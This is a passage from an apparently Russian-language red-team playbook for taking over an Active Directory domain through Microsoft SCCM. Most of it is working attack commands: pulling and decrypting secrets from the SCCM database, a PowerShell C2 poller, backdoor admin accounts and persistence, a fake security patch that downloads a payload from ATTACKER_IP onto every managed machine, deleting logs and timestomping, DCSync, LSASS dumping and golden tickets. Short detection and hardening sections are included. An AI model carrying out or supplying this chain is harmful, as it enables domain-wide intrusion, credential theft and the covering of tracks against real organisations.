# Проверяем репликацию прав
.\SharpSCCM.exe get class-instances SMS_SCI_SiteDefinition \
    -mp cas.target.domain \
    -sc CAS

# Hierarchy Takeover через добавление себя как Full Admin на CAS
# (если Primary Admin = CAS Admin)
curl -sk -u "TARGET\sccm_admin:AdminPass!" -X POST \
    "https://cas.target.domain/AdminService/wmi/SMS_Admin" \
    -H "Content-Type: application/json" \
    -d "{
        \"LogonName\": \"TARGET\\\\lowpriv_user\",
        \"RoleNames\": [\"Full Administrator\"],
        \"CategoryNames\": [\"All\"],
        \"AdminSid\": \"$(python3 -c \"import ldap3; ...\")\"
    }"

# Альтернатива: SQL репликация между CAS и Primary
# Если мы sysadmin на Primary SQL → читаем реплицированные данные CAS
USE CM_CAS;  -- или аналогичная БД на CAS
SELECT LogonName, AdminID FROM SMS_Admins;
OPSEC-заметки
text

РИСКИ ФАЗЫ 3:
[!] Client Push trigger → Event ID 7045 на целевой машине
    МИТИГАЦИЯ: один trigger, не повторять

[!] Application/Package deploy → видно в SCCM Console в реальном времени
    МИТИГАЦИЯ: использовать существующие легитимные имена ("MS Defender Update")
    
[!] CMPivot queries → логируются в SMS_CMPivot таблице в SQL
    МИТИГАЦИЯ: удалить записи после использования (если есть права)
    
[!] xp_cmdshell на SQL → SQL audit logs
    МИТИГАЦИЯ: использовать SQLCLR или linked server вместо xp_cmdshell
    
[!] Новый SCCM Admin → изменение в SMS_Admin таблице, видно в Console
    МИТИГАЦИЯ: временное добавление, удаление после use
    
[!] Collection creation → видно в SCCM audit logs
    МИТИГАЦИЯ: использовать существующие коллекции (SMS00001 = All Systems)
Pivot-точки
text

SCCMSERVER$ NTLM/shadow creds → secretsdump SCCM сервера → DA
SCCM Full Admin → деплой на DC → SYSTEM на DC → Фаза 5
SQL sysadmin → xp_cmdshell на SQL Server → если SQL на DC → DCSync
Successful payload на DC → Фаза 4+5
Decision Tree Фазы 3
text

Client Push включён?
├── ДА → Шаг 3.1 (relay) → shadow creds SCCMSERVER$ → dump → DA
└── НЕТ → Шаг 3.2 (fake device policy)

Текущий user = SCCM Full Admin?
├── ДА → Шаг 3.4 (прямой деплой на DC)
└── НЕТ → ищем путь через relay (3.1) или SQL (3.6)

SQL доступен?
├── ДА, sysadmin → Шаг 3.6 → xp_cmdshell → SYSTEM на SQL → если на DC = DA
├── ДА, db_owner → Шаг 3.6 → читаем секреты из DB
└── НЕТ → relay или AdminService

Иерархия CAS+Primary?
├── ДА → Шаг 3.7 → CAS takeover = все сайты
└── НЕТ → один Primary → Шаг 3.4
Защитные меры (для отчёта)
text

DETECTION:
- Event ID 7045: новый service на managed машинах после SCCM deploy
- SCCM Audit Logs: создание новых Application/Package/Collection объектов
- SQL Audit: изменения в SMS_Admin, xp_cmdshell execution
- Network: SMB подключение от SCCM MP к нестандартным хостам
- SIEM: Alert на CMPivot queries содержащие shell команды

HARDENING:
- Отключить Client Push, использовать client.msi с GPO
- Включить Require Approval для всех Application deployments
- SQL Server: minimal rights для SCCM сервисного аккаунта, отключить xp_cmdshell
- AdminService: TLS mutual auth, IP whitelist
- SCCM роли: разделение по принципу least privilege, отдельные роли для deploy vs read
- CMPivot: ограничить доступ через SCCM RBAC
- Аудит изменений в SMS_Admin через SQL Server Audit
ФАЗА 4: POST-EXPLOITATION ЧЕРЕЗ SCCM
Цель фазы
Максимизировать воздействие через SCCM как платформу: persistence, C2, массовый domain-wide RCE, извлечение всех секретов.

Предусловия
SCCM Full Admin права (прямые или через компрометацию сервера)
SYSTEM на SCCM Primary Site Server
Доступ к SCCM SQL Database
Инструменты
SharpSCCM
MalSCCM
PowerSCCM
impacket — mssqlclient, secretsdump
mimikatz (на SCCM сервере)
SCCMHunter
netexec
Последовательность действий
Шаг 4.1: Извлечение ВСЕХ секретов из SCCM SQL Database
Что делаем: Извлекаем все зашифрованные секреты из SCCM SQL базы данных и дешифруем их используя ключ шифрования SCCM.

Команда:

SQL

-- Подключаемся к SCCM SQL DB
-- python3 mssqlclient.py -windows-auth TARGET/sccm_admin@SQLSERVER

USE CM_S01;  -- замени S01 на ваш site code

-- Все учётные записи (NAA, Task Sequence accounts, etc.)
SELECT 
    UserName,
    Password,  -- зашифровано DPAPI/3DES
    AccountUsage,
    SiteCode
FROM dbo.vSMS_SC_UserAccount
ORDER BY AccountUsage;

-- Task Sequence секреты
SELECT 
    TS.Name,
    TS.PackageID,
    TSD.Sequence  -- XML с потенциально встроенными кредами
FROM dbo.v_TaskSequence TS
JOIN dbo.v_TaskSequencePackage TSP ON TS.PackageID = TSP.PackageID
JOIN dbo.v_TaskSequencePackageXML TSD ON TS.PackageID = TSD.PackageID;

-- Certificates используемые SCCM
SELECT * FROM dbo.SC_Certificate;

-- Site control file (содержит конфигурацию и потенциальные секреты)
SELECT * FROM dbo.SC_SiteDefinition_Property
WHERE Name LIKE '%Password%' OR Name LIKE '%Credential%';

-- Machine certificates для клиентов (SCCM PKI)
SELECT 
    FQDN,
    CertificateBytes,
    IssuedTo
FROM dbo.CertificateInfo;

-- Collection membership (для разведки)  
SELECT 
    CM.CollectionID,
    C.Name AS CollectionName,
    R.Name AS DeviceName,
    R.Full_Domain_Name,
    R.Last_Logon_User_Name,
    R.IPAddresses
FROM dbo.v_CollectionMembers CM
JOIN dbo.v_Collection C ON CM.CollectionID = C.CollectionID
JOIN dbo.v_R_System R ON CM.ResourceID = R.ResourceID
ORDER BY C.Name;

-- Hardware inventory — локальные администраторы на машинах
SELECT 
    R.Name,
    G.GroupName,
    G.Domain,
    G.Account
FROM dbo.v_GS_LOCAL_GROUP_MEMBERS G
JOIN dbo.v_R_System R ON G.ResourceID = R.ResourceID
WHERE G.GroupName = 'Administrators';

-- Software inventory — установленное ПО (для additional attack surface)
SELECT DISTINCT
    R.Name,
    S.ProductName,
    S.ProductVersion
FROM dbo.v_GS_INSTALLED_SOFTWARE S
JOIN dbo.v_R_System R ON S.ResourceID = R.ResourceID
WHERE S.ProductName LIKE '%VPN%' OR S.ProductName LIKE '%SSH%' 
   OR S.ProductName LIKE '%Password%' OR S.ProductName LIKE '%KeePass%'
ORDER BY R.Name;
Дешифровка извлечённых паролей:

PowerShell

# На SCCM сервере (SYSTEM права) — дешифруем через DPAPI
# Ключ хранится в реестре
$key = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\SMS\Security").SecurityKey

# SharpSCCM может автоматически дешифровать
.\SharpSCCM.exe local secrets -disk
.\SharpSCCM.exe local secrets -wmi

# Mimikatz DPAPI на SCCM сервере
# Дампим LSA secrets которые могут содержать SCCM ключи
sekurlsa::dpapi
lsadump::lsa /patch
lsadump::secrets

# SCCMHunter dpapi модуль
python3 sccmhunter.py dpapi \
    -u sccm_admin \
    -p 'AdminPass!' \
    -d TARGET.DOMAIN \
    -dc-ip 10.10.10.1 \
    -target-server SCCMSERVER.TARGET.DOMAIN
Ожидаемый результат:

text

[+] UserAccount[0]: TARGET\svc_naa : N@ASecretPwd2024
[+] UserAccount[1]: TARGET\svc_domainjoin : DomJoin@2024!
[+] UserAccount[2]: TARGET\svc_sql : SQLSvc#Pass1
[+] TaskSequence: Win11_Deploy → OSDJoinPassword: TS_P@ssword!
[+] Certificate: SCCMSERVER (expires 2025-06-01) → extracted to sccmserver.pfx
Шаг 4.2: SCCM как C2 канал — легитимный трафик
Что делаем: Используем SCCM Script Runner и CMPivot как канал связи — трафик легитимен и подписан SCCM сертификатами.

Команда:

PowerShell

# Создаём persistent Script для polling команд с C2 сервера
$c2ScriptContent = @'
$c2_url = "https://C2_SERVER/cmd"
$result_url = "https://C2_SERVER/result"
try {
    $cmd = (Invoke-WebRequest -Uri $c2_url -UseBasicParsing).Content
    if ($cmd -ne "") {
        $result = Invoke-Expression $cmd 2>&1 | Out-String
        Invoke-WebRequest -Uri $result_url -Method POST -Body $result -UseBasicParsing
    }
} catch {}
'@

# Конвертируем в base64
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($c2ScriptContent))

# Создаём SCCM Script
.\SharpSCCM.exe new script \
    -mp sccm.target.domain \
    -sc S01 \
    -n "Diagnostic-Collector" \
    -p "powershell.exe -nop -w hidden -enc ${encoded}"

# Создаём Maintenance Window расписание для регулярного запуска
# Или Schedule задачу через SCCM

# Деплоим как Configuration Baseline (незаметнее чем Application)
# Baseline → Compliance check → Remediation = наш payload
Шаг 4.3: Persistence через SCCM
Что делаем: Устанавливаем persistence механизмы используя SCCM функциональность которая выживает после рестарта и патчинга.

Команда:

PowerShell

# === Метод 1: Configuration Baseline с Remediation ===
# Baseline проверяет условие и запускает remediation (payload)
# Это запускается регулярно по расписанию

# Создаём Config Item с remediation
$ci_body = @{
    Name = "Security-Compliance-Check"
    Description = "Windows Security Compliance"
    CIType = 1  # Windows
    IsEnabled = $true
    ComplianceRules = @(
        @{
            RuleType = "Script"
            ScriptType = "PowerShell"
            DiscoveryScript = "if (Test-Path C:\Windows\Tasks\update.ps1) { 'Compliant' } else { 'NonCompliant' }"
            RemediationScript = "powershell.exe -enc PAYLOAD_BASE64"
            NonComplianceMessage = "Update required"
        }
    )
} | ConvertTo-Json -Depth 5

# Деплоим Baseline на все машины

# === Метод 2: Task Sequence с Scheduled Task ===
# Task Sequence step: Create Scheduled Task
.\SharpSCCM.exe new application \
    -mp sccm.target.domain \
    -sc S01 \
    -n "WinUpdate-Service" \
    -cmd "schtasks /create /tn 'WindowsUpdate' /tr 'powershell -enc PAYLOAD' /sc MINUTE /mo 30 /ru SYSTEM /f"

# === Метод 3: Client Settings изменение ===
# Изменяем Client Agent settings для выполнения кастомных действий
# (требует Full Admin)

# === Метод 4: Backdoor SCCM Admin Account ===
# Добавляем наш аккаунт как Full Admin (или shadow group)
curl -sk -u "TARGET\sccm_admin:AdminPass!" -X POST \
    "https://sccm.target.domain/AdminService/wmi/SMS_Admin" \
    -H "Content-Type: application/json" \
    -d '{
        "LogonName": "TARGET\\backdoor_user",
        "RoleNames": ["Full Administrator"],
        "CategoryNames": ["All"]
    }'
Шаг 4.4: Массовый domain-wide RCE через SCCM
Что делаем: Деплоим payload на ВСЕ managed системы одновременно. SCCM управляет обычно 80-100% машин домена.

Команда:

PowerShell

# Проверяем сколько машин в All Systems
$count = (curl -sk -u "TARGET\sccm_admin:AdminPass!" \
    "https://sccm.target.domain/AdminService/v1.0/Device?\$count=true")
Write-Host "Total managed devices: $count"

# === Метод 1: Script Run на All Systems (мгновенный) ===
.\SharpSCCM.exe exec \
    -mp sccm.target.domain \
    -sc S01 \
    -collection-id SMS00001 \  # All Systems
    -p "powershell.exe -nop -w hidden -enc PAYLOAD_BASE64" \
    -run-as-user "SYSTEM"

# === Метод 2: Required Application Deploy (принудительный) ===
# Создаём Application
.\SharpSCCM.exe new application \
    -mp sccm.target.domain \
    -sc S01 \
    -n "Critical-Security-Patch-KB5031354" \
    -cmd "cmd /c certutil -urlcache -f http://ATTACKER_IP/payload.exe C:\Windows\Temp\svc.exe && C:\Windows\Temp\svc.exe"

# Деплоим как Required (принудительная установка без взаимодействия с пользователем)
.\SharpSCCM.exe new deployment \
    -mp sccm.target.domain \
    -sc S01 \
    -n "Critical-Security-Patch-KB5031354" \
    -collection-id SMS00001 \
    -deployment-purpose Required \
    -available-date-time (Get-Date).AddMinutes(-5)  # уже доступно

# === Метод 3: Software Update (через WSUS интеграцию) ===
# Создаём "update" который фактически выполняет payload
# (продвинутый метод, требует WSUS admin прав)

# === Метод 4: Client Notification для немедленного выполнения ===
# Отправляем BGB notification на все клиенты для немедленного check-in
.\SharpSCCM.exe invoke update-policy \
    -mp sccm.target.domain \
    -sc S01 \
    -collection-id SMS00001
Ожидаемый результат:

text

[*] Deploying to collection: All Systems (SMS00001)
[*] 247 devices targeted
[*] Deployment created: Critical-Security-Patch-KB5031354
[*] Estimated completion: ~60 minutes (based on client polling interval)
[+] Callbacks received from 89 devices in first 15 minutes
Шаг 4.5: Очистка следов через SCCM логи
Что делаем: Удаляем артефакты атаки из SCCM логов и базы данных.

Команда:

SQL

-- На SCCM SQL Server — удаляем следы

-- Удаляем fake application
USE CM_S01;
DELETE FROM dbo.v_Package WHERE Name = 'Critical-Security-Patch-KB5031354';

-- Удаляем deployment
DELETE FROM dbo.v_DeploymentSummary WHERE CollectionName = 'Targets';

-- Удаляем созданные скрипты
DELETE FROM dbo.Scripts WHERE ScriptName = 'Diagnostic-Collector';

-- Удаляем fake SCCM Admin (backdoor)
DELETE FROM dbo.RBAC_Admins WHERE LogonName = 'TARGET\backdoor_user';

-- Удаляем CMPivot query history
DELETE FROM dbo.CMPivot WHERE QueryText LIKE '%powershell%';

-- Удаляем Status Messages связанные с нашими действиями
DELETE FROM dbo.StatusMessages 
WHERE Time > DATEADD(hour, -24, GETDATE()) 
AND Component = 'SMS_DISTRIBUTION_MANAGER';
PowerShell

# На SCCM сервере — очистка IIS и application логов
# Очищаем IIS access logs за период атаки
$logPath = "C:\inetpub\logs\LogFiles\W3SVC1\"
Get-ChildItem $logPath -Filter "*.log" | ForEach-Object {
    $content = Get-Content $_.FullName
    $filtered = $content | Where-Object { 
        $_ -notmatch "ATTACKER_IP|/AdminService/wmi/SMS_Scripts|/AdminService/wmi/SMS_Admin"
    }
    $filtered | Set-Content $_.FullName
}

# Очищаем SCCM специфичные логи
$sccmLogs = "C:\Program Files\Microsoft Configuration Manager\Logs\"
Remove-Item "${sccmLogs}smsprov.log" -Force
Remove-Item "${sccmLogs}adminservice.log" -Force

# Windows Event Log очистка (опасно — заметно)
# Clear-EventLog -LogName "Application","System","Security" — только если в RoE
wevtutil cl Application
wevtutil cl System
OPSEC-заметки
text

РИСКИ ФАЗЫ 4:
[!] Массовый деплой → SIEM alert на внезапное массовое outbound соединение
    МИТИГАЦИЯ: degrade deployment — использовать Maintenance Windows, 
    разбить на маленькие коллекции
    
[!] SQL изменения → SQL Server Audit если настроен
    МИТИГАЦИЯ: проверить наличие аудита перед изменениями
    SELECT * FROM sys.server_audits;
    
[!] IIS log edit → изменение времени модификации файлов
    МИТИГАЦИЯ: timestomp после редактирования
    (Get-Item $file).LastWriteTime = "2024-01-01 00:00:00"
    
[!] C2 трафик через SCCM → нестандартные destination IP в SCCM трафике
    МИТИГАЦИЯ: использовать C2 за легитимным CDN или domain fronting
    
[!] Удаление SCCM Admin → видно в SCCM Audit log и Console
    МИТИГАЦИЯ: не удалять свежедобавленный backdoor слишком быстро
Pivot-точки
text

SYSTEM на всех managed машинах → полный домен скомпрометирован
SQL secrets дешифрованы → дополнительные svc accounts → другие системы
SCCM machine certs → могут использоваться для auth в других системах
Hardware inventory → карта всех систем для доп. атак
Защитные меры (для отчёта)
text

DETECTION:
- SCCM Audit Log: включить полный аудит всех admin actions
- SQL Server Audit: INSERT/UPDATE/DELETE на критических таблицах
- SIEM: Alert на деплой приложений на "All Systems" коллекцию
- EDR: Обнаружение mass deployment паттернов (одинаковый процесс на 100+ машинах в час)
- File Integrity Monitoring на SCCM логи

HARDENING:
- Включить SCCM Role-Based Administration: разные роли для разных действий
- Требовать Approval для всех Application deployments  
- Ограничить кому разрешено деплоить на "All Systems"
- SQL: Полный аудит SCCM DB таблиц через SQL Server Audit specification
- Immutable logging: SCCM логи в SIEM с защитой от записи
- Application Control: не разрешать SCCM деплоить unsigned executables
ФАЗА 5: ПОЛНЫЙ ЗАХВАТ ДОМЕНА
Цель фазы
Конвертировать SCCM компрометацию в Domain Admin / Enterprise Admin.

Предусловия
SYSTEM на SCCM Server или SCCM Full Admin rights
Payload выполняется на DC (из Фазы 4)
Или: hash SCCMSERVER$ machine account
Инструменты
mimikatz / pypykatz
impacket — secretsdump, psexec, wmiexec, getST
Rubeus
BloodHound (для нахождения пути)
netexec
Последовательность действий
Шаг 5.1: От SCCM SYSTEM к Domain Admin — стандартные пути
Что делаем: SCCM Server обычно имеет расширенные права в домене. SCCMSERVER$ может иметь права DCSync, LocalAdmin на DC, или GenericAll на различных объектах.

Команда:

Bash

# === Путь 1: SCCMSERVER$ machine account → если имеет права ===
# Проверяем что может делать SCCMSERVER$ в AD
python3 /opt/impacket/examples/dacledit.py \
    -action read \
    -principal "SCCMSERVER$" \
    -dc-ip DC_IP \
    TARGET.DOMAIN/lowpriv_user:password

# Если SCCMSERVER$ имеет DCSync rights (Replicating Directory Changes All)
# Или является членом DA/EA группы:
python3 /opt/impacket/examples/secretsdump.py \
    -hashes :NT_HASH_OF_SCCMSERVER \
    -dc-ip DC_IP \
    TARGET.DOMAIN/SCCMSERVER\$@DC_IP

# Если используем shadow creds/PKCE ticket (из Шага 3.1)
export KRB5CCNAME=/tmp/SCCMSERVER.ccache
python3 /opt/impacket/examples/secretsdump.py \
    -k -no-pass \
    -dc-ip DC_IP \
    TARGET.DOMAIN/SCCMSERVER\$@DC01.TARGET.DOMAIN

# === Путь 2: SCCM SQL sysadmin → SQL Server на DC → DA ===
# Если SQL Server установлен НЕПОСРЕДСТВЕННО на DC (частая конфигурация):
python3 /opt/impacket/examples/mssqlclient.py \
    -windows-auth \
    TARGET/sccm_sql_account:SqlPass@DC01.TARGET.DOMAIN

# SQL exec на DC = NT AUTHORITY\SYSTEM на DC = DA
EXEC xp_cmdshell 'powershell -enc DA_PAYLOAD';

# === Путь 3: SYSTEM через SCCM deployment на DC ===
# Payload уже выполняется на DC (из Фазы 4, Шаг 4.4)
# Дампим LSASS на DC

# Через SharpSCCM + Mimikatz  
.\SharpSCCM.exe exec \
    -mp sccm.target.domain \
    -sc S01 \
    -d DC01 \
    -p "powershell -c \"[System.IO.File]::WriteAllBytes('C:\Windows\Temp\m.exe', [System.Convert]::FromBase64String('MIMIKATZ_BASE64')); C:\Windows\Temp\m.exe 'sekurlsa::logonpasswords' 'exit' > C:\Windows\Temp\out.txt\""

# Или через Task Scheduler на DC
.\SharpSCCM.exe exec \
    -mp sccm.target.domain \
    -sc S01 \
    -d DC01 \
    -p "cmd /c schtasks /create /tn sys /tr 'powershell -enc LSASS_DUMP_PAYLOAD' /sc ONCE /st 00:00 /ru SYSTEM /f && schtasks /run /tn sys"
Шаг 5.2: DCSync через SCCM SQL Server
Что делаем: Если SCCM SQL Server имеет доступ к DC или сам является членом привилегированных групп.

Команда:

Bash

# Проверяем членство SCCM SQL сервисного аккаунта
ldapsearch -x -H ldap://DC_IP \
    -D "lowpriv_user@TARGET.DOMAIN" \
    -w "Password123!" \
    -b "DC=TARGET,DC=DOMAIN" \
    "(sAMAccountName=svc_sccm_sql)" \
    memberOf

# Если svc_sccm_sql в Domain Admins или имеет Replicating Directory Changes:
python3 /opt/impacket/examples/secretsdump.py \
    -dc-ip DC_IP \
    TARGET.DOMAIN/svc_sccm_sql:SqlSvcPass@DC01.TARGET.DOMAIN

# Если SQL Server machine account имеет DCSync права:
python3 /opt/impacket/examples/secretsdump.py \
    -hashes :SQLSERVER_NTHASH \
    TARGET.DOMAIN/SQLSERVER\$@DC01.TARGET.DOMAIN

# Через NetExec
netexec smb DC01.TARGET.DOMAIN \
    -u svc_sccm_sql \
    -p 'SqlSvcPass' \
    -d TARGET.DOMAIN \
    --ntds
Шаг 5.3: Финальный дамп и документирование
Что делаем: После получения DA — полный дамп домена для документирования компрометации.

Команда:

Bash

# DCSync всего домена
python3 /opt/impacket/examples/secretsdump.py \
    -just-dc \
    -outputfile domain_hashes \
    -dc-ip DC_IP \
    TARGET.DOMAIN/DA_account:DA_password@DC01.TARGET.DOMAIN

# Или с DA hash
python3 /opt/impacket/examples/secretsdump.py \
    -just-dc \
    -hashes :DA_NTHASH \
    -outputfile domain_hashes \
    TARGET.DOMAIN/Administrator@DC01.TARGET.DOMAIN

# Krbtgt hash для Golden Ticket (доказательство полного компромиса)
grep "krbtgt" domain_hashes.ntds

# Enterprise Admin через krbtgt
python3 /opt/impacket/examples/ticketer.py \
    -nthash KRBTGT_NTHASH \
    -domain-sid S-1-5-21-XXXX \
    -domain TARGET.DOMAIN \
    -groups 512,519 \
    -user-id 500 \
    Administrator

# Проверяем доступ в лесу (Enterprise Admin)
export KRB5CCNAME=Administrator.ccache
python3 /opt/impacket/examples/secretsdump.py \
    -k -no-pass \
    FOREST_ROOT_DC.TARGET.FOREST

# BloodHound dump для финального отчёта
python3 -m bloodhound \
    -d TARGET.DOMAIN \
    -u Administrator \
    -H DA_NTHASH \
    -dc DC01.TARGET.DOMAIN \
    -c All \
    --zip

# Документируем всё найденное
cat << 'EOF' > compromise_summary.md
# Domain Compromise Summary
## Date: $(date)
## Method: SCCM Attack Chain

### Compromised Credentials:
- krbtgt: [HASH]
- Administrator: [HASH]
- All domain accounts: domain_hashes.ntds

### Attack Path:
1. PXE/NAA credential harvesting → domain user
2. SCCM Client Push Coercion → SCCM SYSTEM  
3. SCCM deployment on DC01 → DC SYSTEM
4. DCSync → krbtgt hash
5. Golden Ticket → Enterprise Admin

### Persistence:
- Golden Ticket valid: 10 years
- SCCM backdoor admin: backdoor_user
EOF
Шаг 5.4: Использование SCCM computer accounts для атак
Что делаем: SCCM managed computer accounts часто используются для inter-system auth и могут открывать дополнительные пути.

Команда:

Bash

# Находим компьютеры где SCCM server является LocalAdmin
# (SCCM Server$ часто добавляется в local admins при client push)
netexec smb 10.10.10.0/24 \
    -u 'SCCMSERVER$' \
    --use-kcache \
    --local-auth \
    2>/dev/null | grep "Pwn3d!"

# Если SCCMSERVER$ является LocalAdmin на других серверах
python3 /opt/impacket/examples/wmiexec.py \
    -hashes :SCCMSERVER_NTHASH \
    -dc-ip DC_IP \
    TARGET.DOMAIN/SCCMSERVER\$@FILESERVER01.TARGET.DOMAIN

# Проверка RBCD путей от SCCM accounts
# BloodHound запрос: кто может олицетворять кого через SCCM accounts?
# Cypher:
MATCH p=(c:Computer {name:"SCCMSERVER.TARGET.DOMAIN"})-[:AllowedToDelegate]->(t:Computer)
RETURN p

# Unconstrained delegation (если SCCM настроен с unconstrained deleg)
netexec smb 10.10.10.50 \
    -u lowpriv_user \
    -p 'Password123!' \
    -d TARGET.DOMAIN \
    -M spider_plus \
    --spider C$ 2>/dev/null | grep -i "unconstrained"

# Rubeus — TGT harvesting через unconstrained delegation coercion
.\Rubeus.exe monitor /interval:5 /filteruser:DC01$

# Coerce DC01$ authentication к SCCMSERVER (если unconstrained deleg)
# PetitPotam, PrinterBug, и т.д.
python3 /opt/PetitPotam/PetitPotam.py \
    -u lowpriv_user \
    -p 'Password123!' \
    SCCMSERVER.TARGET.DOMAIN \
    DC01.TARGET.DOMAIN

# Rubeus поймает DC01$ TGT → DCSync
.\Rubeus.exe ptt /ticket:BASE64_TGT
OPSEC-заметки
text

ФИНАЛЬНЫЕ OPSEC СООБРАЖЕНИЯ:
[!] DCSync генерирует Event 4662 (Object Access) на DC
    МИТИГАЦИЯ: использовать wmiexec/psexec на DC для локального dump
    
[!] Golden Ticket с аномальным lifetime → детектируется Defender
    МИТИГАЦИЯ: использовать стандартный 10-часовой lifetime
    
[!] Дамп NTDS.dit — большой файл, передача по сети заметна
    МИТИГАЦИЯ: zip + chunked transfer, или использовать secretsdump (in-memory)
    
[!] PetitPotam/coercion → Event ID 4768 с нестандартным источником
    МИТИГАЦИЯ: минимальное количество coercion requests
Индикаторы успеха финала
text

✅ krbtgt NT hash получен
✅ Golden/Diamond ticket создан и верифицирован  
✅ Enterprise Admin TGT получен
✅ Все Domain Controllers accessible
✅ BloodHound показывает "path complete"
✅ Все компрометированные credentials задокументированы
Защитные меры (для отчёта)
text

КРИТИЧЕСКИЕ РЕКОМЕНДАЦИИ:

1. SCCM Configuration:
   - Enhanced HTTP или PKI ТОЛЬКО, без HTTP
   - Отключить Client Push Auto, использовать только manual/GPO
   - PXE пароль + BitLocker на Task Sequence media
   - Минимальные права для всех SCCM service accounts
   - NAA: отдельный аккаунт, только read на DP, не в domain groups

2. Network:
   - Сегрегация SCCM сети: MP/DP/SQL в отдельном VLAN
   - Firewall: SCCM клиенты → только MP IP, только порт 80/443/10123
   - SQL Server: firewall только для SCCM сервера, не для клиентов

3. Active Directory:
   - SCCMSERVER$ — минимальные права, не LocalAdmin на DC
   - Нет Unconstrained Delegation для SCCM accounts
   - Регулярный аудит ACL на CN=System Management
   - Protected Users группа для SCCM admin accounts

4. Monitoring:
   - Microsoft Sentinel: SCCM + Azure Arc интеграция
   - SCCM native audit: включить все категории
   - Defender for Endpoint: мониторинг SCCM client процессов
   - Alert: любой deploy на "All Systems" вне maintenance window

5. Hardening специфично для SCCM:
   - CB 2303+: Hierarchy Settings → Block Active SCCM clients
   - Включить Automatic Account Management для NAA rotation
   - Task Sequences: использовать MDT UDI или Azure KeyVault для секретов
   - Не хранить local admin passwords в SCCM (использовать LAPS)
СВОДНАЯ ТАБЛИЦА ИНСТРУМЕНТОВ
text

┌─────────────────┬────────────────────────────────────────┬──────────────┐
│ Инструмент      │ Применение                             │ Платформа    │
├─────────────────┼────────────────────────────────────────┼──────────────┤
│ PXEThief        │ PXE var extraction, bruteforce         │ Python/Linux │
│ sccmwtf         │ Unauthenticated NAA harvest            │ Python/Linux │
│ SCCMHunter      │ Full hierarchy recon, DPAPI            │ Python/Linux │
│ SharpSCCM       │ Enum, NAA, deploy, exec, coercion      │ C#/Windows   │
│ MalSCCM         │ Device reg, policy req, exec           │ C#/Windows   │
│ PowerSCCM       │ PowerShell SCCM interaction            │ PS/Windows   │
│ ntlmrelayx      │ NTLM relay (LDAP/SMB/HTTP)             │ Python/Linux │
│ Responder       │ LLMNR/NBT-NS poisoning                 │ Python/Linux │
│ mitm6           │ IPv6 DHCP + WPAD poisoning             │ Python/Linux │
│ mssqlclient     │ SQL Server interaction                 │ Python/Linux │
│ secretsdump     │ DCSync, local dump                     │ Python/Linux │
│ mimikatz        │ LSASS dump, DPAPI, golden ticket       │ C/Windows    │
│ Rubeus          │ Kerberos attacks, TGT harvest          │ C#/Windows   │
│ BloodHound      │ AD graph, path finding                 │ Any          │
│ netexec         │ SMB/MSSQL/WMI multipurpose             │ Python/Linux │
└─────────────────┴────────────────────────────────────────┴──────────────┘
ВЕРСИОННАЯ МАТРИЦА АТАК
text

┌────────────────────────────────┬──────┬──────┬──────┬──────┬──────┐
│ Атака                          │ 2002 │ 2103 │ 2203 │ 2303 │ 2309 │
├────────────────────────────────┼──────┼──────┼──────┼──────┼──────┤
│ PXE без пароля                 │  ✓   │  ✓   │  ✓   │  ✓   │  ✓   │
│ HTTP MP unauthenticated NAA    │  ✓   │  ✓*  │  ✗   │  ✗   │  ✗   │
│ Fake device registration       │  ✓   │  ✓   │  ✓   │  ✓   │  ✓   │
│ Client Push Coercion           │  ✓   │  ✓   │  ✓   │  ✓   │  ✓   │
│ AdminService unauthenticated   │  ✓   │  ✗   │  ✗   │  ✗   │  ✗   │
│ CMPivot RCE (Full Admin)       │  ✓   │  ✓   │  ✓   │  ✓   │  ✓   │
│ Hierarchy Takeover             │  ✓   │  ✓   │  ✓   │  ✓   │  ✓   │
│ SQL credential extraction      │  ✓   │  ✓   │  ✓   │  ✓   │  ✓   │
└────────────────────────────────┴──────┴──────┴──────┴──────┴──────┘
* = с eHTTP уязвимость устранена